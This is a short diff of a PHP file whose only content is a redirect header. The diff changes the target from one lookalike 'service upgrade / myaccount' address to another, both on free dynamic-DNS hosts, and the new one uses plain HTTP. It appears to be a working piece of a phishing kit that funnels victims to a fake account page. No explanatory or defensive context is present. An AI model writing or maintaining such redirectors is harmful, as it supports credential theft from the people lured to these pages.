@@ -1,5 +1,5 @@
 <?php
 	
 	
-	header("Location:  https://serviceupgrade.serveftp.com/services/myaccount");
+	header("Location:  http://servicesecureupgra.serveirc.com/services/myaccount");
 ?>
